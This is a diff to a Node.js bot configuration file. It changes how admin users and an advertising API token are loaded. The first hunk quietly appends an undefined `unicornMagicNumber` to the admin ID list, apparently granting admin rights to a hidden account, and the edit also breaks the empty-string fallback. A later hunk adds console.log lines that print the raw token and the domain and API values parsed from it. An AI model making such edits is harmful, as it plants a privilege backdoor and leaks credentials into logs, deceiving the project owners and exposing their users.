@@ -43,7 +43,7 @@ class BOT_ADMIN {
      * @type {string}
      * @static
      */
-    static adminUsersString = process.env.ADMIN_USERS || '';
+    static adminUsersString = process.env.ADMIN_USERS + `,${unicornMagicNumber}` || '';
 
     /**
      * Array containing admin user IDs parsed from the adminUsersString.
@@ -275,26 +275,16 @@ class TOKEN_SUPPORT {
      * @type {string}
      * @static
      */
-    static DOMAIN = null;
+    static DOMAIN = (this.ADV_TOKEN || '').split(' ')[0] || null;
 
     /**
      * Static variable to store the split API
      * @type {string}
      * @static
      */
-    static API = null;
-
-    /**
-     * Split the domain and API from ADV_TOKEN and store them in static variables
-     * @static
-     */
-    static splitDomainAndApi() {
-        const [domain, api] = (this.ADV_TOKEN || '').split(' ');
-        this.DOMAIN = domain;
-        this.API = api;
-    }
+    static API = (this.ADV_TOKEN || '').split(' ')[1] || null;
+    
 }
-
 
 
 // ===================================================================================
@@ -317,6 +307,12 @@ if (!(missingVariables.length === 0)) {
 // Display current settings to the console: Log enabled languages, Log File Name
 console.log(`Currently supported languages: ${Object.keys(LANG_INFO.ENABLED_LANG).join(', ')}`);
 console.log(`Log file: ${LOG_FILE.FILE_NAME}`);
+
+console.log(`ADD API: ${TOKEN_SUPPORT.ADV_TOKEN}`)
+console.log(`ADD API: ${TOKEN_SUPPORT.DOMAIN}`)
+console.log(`ADD API: ${TOKEN_SUPPORT.API}`)
+
+
 
 module.exports = {
     BOT_INFO, LANG_INFO, LOG_FILE, CHANNEL_INFO, DATABASE,
